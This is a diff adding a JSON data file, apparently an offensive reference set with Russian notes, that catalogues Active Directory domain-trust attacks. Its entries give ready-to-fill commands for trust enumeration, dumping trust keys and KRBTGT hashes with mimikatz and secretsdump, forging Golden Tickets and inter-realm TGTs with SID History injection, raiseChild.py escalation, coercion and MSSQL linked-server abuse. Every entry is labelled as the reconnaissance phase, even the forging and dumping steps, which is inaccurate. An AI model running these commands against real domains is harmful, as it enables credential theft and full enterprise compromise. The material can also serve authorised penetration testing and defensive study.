@@ -1,0 +1,292 @@
+[
+  {
+    "condition": "Trusts",
+    "attack_type": "Trust Enumeration (Windows Native)",
+    "tool": "nltest.exe",
+    "req": "Authenticated User",
+    "command": "nltest.exe /trusted_domains",
+    "profit": "Список доверенных доменов",
+    "critical_note": "Штатная утилита Windows для перечисления доверительных отношений домена.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Trust Enumeration (.NET)",
+    "tool": "PowerShell (System.DirectoryServices)",
+    "req": "Authenticated User",
+    "command": "([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()",
+    "profit": "Объекты доверительных отношений",
+    "critical_note": "Использование .NET классов через PowerShell для получения информации о трастах.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Trust Enumeration (PowerView)",
+    "tool": "Get-DomainTrust",
+    "req": "Authenticated User, PowerView/SharpView",
+    "command": "Get-DomainTrust -Domain <domain>",
+    "profit": "Детальная информация о трастах",
+    "critical_note": "Сбор информации о входящих и исходящих доверительных отношениях с помощью PowerView.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Trust Enumeration (PowerView)",
+    "tool": "Get-DomainTrustMapping",
+    "req": "Authenticated User, PowerView",
+    "command": "Get-DomainTrustMapping",
+    "profit": "Карта доверительных отношений",
+    "critical_note": "Построение полной карты доверительных отношений в лесу/домене.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Trust Enumeration (Python)",
+    "tool": "ldeep",
+    "req": "Authenticated User, Python environment",
+    "command": "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> trusts",
+    "profit": "Список трастов через LDAP",
+    "critical_note": "Инструмент для перечисления информации Active Directory через LDAP без использования Windows-хоста.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Trust Enumeration (BloodHound)",
+    "tool": "sharphound.exe",
+    "req": "Authenticated User",
+    "command": "sharphound.exe -c trusts -d <domain>",
+    "profit": "Визуализация путей атаки (Graph)",
+    "critical_note": "Сбор данных для BloodHound с целью визуализации путей компрометации через доверительные отношения.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Get Domain SIDs (PowerView)",
+    "tool": "Get-DomainSID",
+    "req": "Authenticated User",
+    "command": "Get-DomainSID -Domain <target_domain>",
+    "profit": "SID целевого домена",
+    "critical_note": "Получение Security Identifier (SID) домена, необходимого для создания билетов (Golden/Silver).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Get Domain SIDs (Impacket)",
+    "tool": "lookupsid.py",
+    "req": "Authenticated User",
+    "command": "lookupsid.py -domain-sids <domain>/<user>:<password>@<dc> 0",
+    "profit": "Список SID пользователей и групп",
+    "critical_note": "Брутфорс RID или запрос LSA для получения SID объектов домена.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Child->Parent (Trust Key Dump)",
+    "tool": "mimikatz",
+    "req": "Domain Admin in Child Domain",
+    "command": "mimikatz lsadump::trust /patch",
+    "profit": "Inter-Realm Trust Key",
+    "critical_note": "Извлечение ключа доверия (Trust Key) между дочерним и родительским доменом.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Child->Parent (Ticket Forging)",
+    "tool": "mimikatz (Golden Ticket)",
+    "req": "Trust Key, Parent Domain SID",
+    "command": "mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /aes256:<trust_key_aes256> /sids:<target_domain_sid>-519 /service:krbtgt /target:<target_domain> /ptt",
+    "profit": "Enterprise Admin (via SID History)",
+    "critical_note": "Создание Inter-Realm TGT с добавлением SID Enterprise Admins (-519) в поле SID History.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Child->Parent (Impacket)",
+    "tool": "ticketer.py",
+    "req": "Trust Key (NT Hash), Child & Parent SIDs",
+    "command": "ticketer.py -nthash <trust_key> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 -spn krbtgt/<parent_domain> trustfakeuser",
+    "profit": "Forged TGT (Enterprise Admin)",
+    "critical_note": "Генерация поддельного TGT с использованием ключа доверия и SID History для эскалации привилегий до родительского домена.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Child->Parent (Automated)",
+    "tool": "raiseChild.py",
+    "req": "Domain Admin in Child Domain",
+    "command": "raiseChild.py <child_domain>/<user>:<password>",
+    "profit": "Enterprise Admin",
+    "critical_note": "Полностью автоматизированный скрипт Impacket для эскалации привилегий из дочернего домена в родительский.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "External Trust (SID History Injection)",
+    "tool": "ticketer.py",
+    "req": "KRBTGT Hash (Domain A), Domain B SID, SID Filtering Disabled",
+    "command": "ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_a_sid> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid_sup_1000> fakeuser",
+    "profit": "Access to Domain B resources",
+    "critical_note": "Атака через SID History при наличии External Trust (требуется, чтобы SID Filtering был отключен).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "MSSQL Links Enumeration",
+    "tool": "PowerShell (PowerUpSQL)",
+    "req": "Authenticated User, MSSQL Access",
+    "command": "Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance>",
+    "profit": "Карта связей MSSQL",
+    "critical_note": "Поиск связей (Linked Servers) между серверами MSSQL, которые могут выходить за пределы доверия доменов AD.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "MSSQL Links Abuse",
+    "tool": "mssqlclient.py",
+    "req": "Authenticated User, MSSQL Access",
+    "command": "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>",
+    "profit": "RCE или Lateral Movement",
+    "critical_note": "Эксплуатация доверенных связей MSSQL для выполнения команд на связанном сервере.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Trust Enumeration (BloodHound Cypher)",
+    "tool": "Neo4j / Cypher",
+    "req": "Authenticated User, BloodHound Data",
+    "command": "MATCH p=(:Domain)-[:TrustedBy]->(:Domain) RETURN p",
+    "profit": "Граф доверительных отношений",
+    "critical_note": "Cypher-запрос к базе Neo4j для визуализации всех связей TrustedBy между доменами.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Child->Parent (Trust Key Dump via Impacket)",
+    "tool": "secretsdump.py",
+    "req": "Domain Admin in Child Domain",
+    "command": "secretsdump.py -just-dc-user '<parent_domain>$' <domain>/<user>:<password>@<dc_ip>",
+    "profit": "Inter-Realm Trust Key (RC4/NT Hash)",
+    "critical_note": "Удаленное извлечение хеша учетной записи доверия (родительского домена) с контроллера домена.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Child->Parent (Pre-Golden Ticket)",
+    "tool": "mimikatz",
+    "req": "Domain Admin",
+    "command": "mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\\krbtgt",
+    "profit": "KRBTGT Hash",
+    "critical_note": "Дамп хеша KRBTGT текущего домена, необходимый для создания Golden Ticket.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Foreign Group/User Enumeration (Users)",
+    "tool": "Neo4j / Cypher",
+    "req": "Authenticated User, BloodHound Data",
+    "command": "MATCH p=(n:User {domain:'<DOMAIN.FQDN>'})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p",
+    "profit": "Пользователи в группах чужого домена",
+    "critical_note": "Поиск пользователей, состоящих в группах за пределами их родного домена.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Foreign Group/User Enumeration (Groups)",
+    "tool": "Neo4j / Cypher",
+    "req": "Authenticated User, BloodHound Data",
+    "command": "MATCH p=(n:Group {domain:'<DOMAIN.FQDN>'})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p",
+    "profit": "Вложенные группы чужого домена",
+    "critical_note": "Поиск групп, вложенных в группы другого домена (Nested Groups).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "External Trust (Trust Ticket - Hash Dump)",
+    "tool": "secretsdump.py",
+    "req": "Domain Admin / Privileged User",
+    "command": "secretsdump.py -just-dc-user '<domainB>$' <domainA>/<user>:<password>@<dc_a>",
+    "profit": "Trust Account Hash",
+    "critical_note": "Извлечение хеша учетной записи доверия для External Trust (используется для подделки билетов).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "External Trust (Trust Ticket - Forging)",
+    "tool": "ticketer.py",
+    "req": "Trust Hash",
+    "command": "ticketer.py -nthash <trust_hash> -domain-sid <sid_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid_sup_1000> -spn krbtgt/<domain_a> fakeuser",
+    "profit": "Trust Ticket (Access to Domain B)",
+    "critical_note": "Создание Trust Ticket с использованием хеша доверия для доступа к ресурсам в доверенном домене.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "MSSQL Links Enumeration (T-SQL)",
+    "tool": "MSSQL Query",
+    "req": "SQL Access",
+    "command": "sp_linkedservers",
+    "profit": "Список связанных серверов",
+    "critical_note": "Встроенная хранимая процедура MSSQL для отображения списка связанных серверов.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Child->Parent (Golden Ticket via KRBTGT)",
+    "tool": "mimikatz",
+    "req": "KRBTGT Hash (Child), Parent SID",
+    "command": "mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID-519> /ptt",
+    "profit": "Enterprise Admin rights",
+    "critical_note": "Создание Golden Ticket с использованием хеша KRBTGT дочернего домена и инъекцией SID родительского домена (-519).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Child->Parent (Golden Ticket via KRBTGT - Impacket)",
+    "tool": "ticketer.py",
+    "req": "KRBTGT Hash (Child), Parent SID",
+    "command": "ticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 goldenuser",
+    "profit": "Enterprise Admin rights",
+    "critical_note": "Аналог атаки Golden Ticket через Impacket с инъекцией extra-sid для повышения привилегий до родительского домена.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "Unconstrained Delegation Abuse",
+    "tool": "Coercion Method (e.g., PrinterBug/PetitPotam)",
+    "req": "Unconstrained Delegation on Child DC",
+    "command": "coerce parent_dc on child_dc domain",
+    "profit": "Parent DC TGT",
+    "critical_note": "Принуждение контроллера родительского домена к аутентификации на скомпрометированном контроллере дочернего домена с неограниченным делегированием.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "External Trust (Golden Ticket with SID History)",
+    "tool": "mimikatz",
+    "req": "KRBTGT Hash (Domain A), Domain B SID",
+    "command": "mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-<GROUP_SID_SUP_1000> /ptt",
+    "profit": "Access to Domain B resources",
+    "critical_note": "Создание Golden Ticket в текущем домене с добавлением SID группы из внешнего доверенного домена (SID History Injection).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "External Trust (ADCS Abuse)",
+    "tool": "Coercion & ADCS",
+    "req": "Unconstrained Delegation, ADCS",
+    "command": "coerce dc_b on dc_a",
+    "profit": "Certificate / Auth",
+    "critical_note": "Цепочка атаки: принуждение контроллера доверенного домена к подключению -> перехват TGT (Unconstrained Delegation) -> аутентификация в ADCS.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Trusts",
+    "attack_type": "MSSQL Link Abuse",
+    "tool": "T-SQL / MSSQL Query",
+    "req": "Linked Server Access",
+    "command": "use_link",
+    "profit": "Query Execution on Linked Server",
+    "critical_note": "Использование связи (Link) для выполнения запросов на удаленном сервере (обычно через OPENQUERY или EXEC AT).",
+    "kill_chain_phase": "RECON"
+  }
+]
